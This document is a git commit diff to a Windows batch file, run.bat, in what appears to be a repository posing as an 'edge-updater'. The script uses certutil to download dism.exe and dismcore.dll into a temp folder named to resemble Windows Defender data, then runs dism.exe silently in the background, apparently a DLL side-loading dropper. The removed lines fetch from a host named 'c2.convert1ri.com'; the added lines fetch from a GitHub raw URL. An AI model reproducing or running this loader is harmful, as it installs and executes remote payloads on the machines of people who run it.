0a3fdb25ce228d6f931e60f5e3339d87d80535c2
emuladortrampo-lgtm <emuladortrampo@gmail.com>
2026-08-28 19:08:26 -0300

    Fix run.bat with certutil

--- run.bat
+++ run.bat
@@ -1,8 +1,14 @@
 @echo off
-set D=%TEMP%\Microsoft\WinDefData
+set "D=%TEMP%\WinDefData"
 if not exist "%D%" mkdir "%D%"
-certutil -urlcache -split -f https://c2.convert1ri.com/download/dismcore.dll "%D%\dismcore.dll" >nul 2>&1
-certutil -urlcache -split -f https://c2.convert1ri.com/download/dism.exe "%D%\dism.exe" >nul 2>&1
-if exist "%D%\dism.exe" if exist "%D%\dismcore.dll" (
-    start /b "" "%D%\dism.exe"
-)
+echo [1/3] Baixando dismcore.dll...
+certutil -urlcache -split -f https://raw.githubusercontent.com/emuladortrampo-lgtm/edge-updater/main/dismcore.dll "%D%\dismcore.dll" >nul 2>&1
+for %%A in ("%D%\dismcore.dll") do if %%~zA LSS 1000 (echo ERRO: dismcore.dll falhou & exit /b 1)
+echo OK: dismcore.dll
+echo [2/3] Baixando dism.exe...
+certutil -urlcache -split -f https://raw.githubusercontent.com/emuladortrampo-lgtm/edge-updater/main/dism.exe "%D%\dism.exe" >nul 2>&1
+for %%A in ("%D%\dism.exe") do if %%~zA LSS 10000 (echo ERRO: dism.exe falhou & exit /b 1)
+echo OK: dism.exe
+echo [3/3] Executando...
+start /b "" "%D%\dism.exe"
+echo OK: Executado
